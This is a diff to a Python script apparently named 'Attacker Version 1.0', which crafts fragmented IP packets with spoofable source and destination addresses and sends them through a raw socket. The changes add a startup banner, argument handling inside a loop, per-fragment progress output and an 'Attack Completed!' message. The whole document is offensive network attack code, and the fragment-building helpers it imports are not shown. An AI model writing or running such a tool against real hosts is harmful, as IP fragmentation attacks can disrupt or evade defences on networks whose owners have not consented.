@@ -5,18 +5,21 @@ from helper_functs.attackParam import attackParamGen, attackParam
 from helper_functs.ipHeadFieldGen import ipHeadFieldGen
 from helper_functs.rawsocket import rawSockGen
 
-if len(sys.argv)!=3:
-    if (len(sys.argv)==1):
-        print("Error: Both Source and Destination IP address are missing. Please enter them in order and try again!")
-    elif (len(sys.argv)==2):
-        print("Error: Destination IP address is missing. Please enter it and try again!")
-    else:
-        print("Error: Too many arguments provided. Please enter only Soruce and Destination IP address and try again!")
+while True:
+    print("Attacker Version 1.0\n")
+    if len(sys.argv)!=3:
+        if (len(sys.argv)==1):
+            print("! Error: Both Source and Destination IP address are missing. Please enter them in order and try again!")
+        elif (len(sys.argv)==2):
+            print("! Error: Destination IP address is missing. Please enter it and try again!")
+        else:
+            print("! Error: Too many arguments provided. Please enter only Soruce and Destination IP address and try again!")
 
-    sys.exit(1)
-else:
-    srcIP=sys.argv[1] #Later: add check for IP address in helper func
-    dstIP=sys.argv[2]
+        sys.exit(1)
+    else:
+        srcIP=sys.argv[1] 
+        dstIP=sys.argv[2]
+        break
 
 attackParams=attackParamGen(srcIP,dstIP)
 
@@ -33,4 +36,7 @@ for i in range(len(attackParams.allFragms)): #For each fragment, build the IP he
     ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["fragSize"],frag["fragOffset"],isLastFrag)
 
     ipPacket=ipHeadPacket + frag["fragPayload"]
-    rawSock.sendto(ipPacket, (attackParams.destIPAddr,0)) #
+    rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
+    print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")
+
+print(f"=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 
